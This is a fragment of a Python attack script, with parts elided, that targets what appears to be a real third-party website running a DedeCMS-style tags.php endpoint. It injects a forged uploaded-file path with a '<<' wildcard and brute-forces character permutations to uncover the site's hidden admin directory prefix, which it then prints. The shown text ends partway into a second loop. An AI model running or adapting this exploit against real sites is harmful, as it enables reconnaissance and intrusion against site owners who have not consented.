...
back_dir = ""
flag = 0
url = "http://cbaopack.com.cn/tags.php"
data = {
    "_FILES[mochazz][tmp_name]" : "./{p}<</images/albviewbg.gif",
...
for num in range(1,7):
    ...
    for pre in itertools.permutations(characters,num):
        ...
        if "Upload filetype not allow !" not in r.text and r.status_code == 200:
            flag = 1
            back_dir = pre
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/albviewbg.gif"
            break
        else:
            data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/albviewbg.gif"
print("1111[+] 前缀为：",back_dir)
flag = 0
for i in range(30):
    if flag:
        break
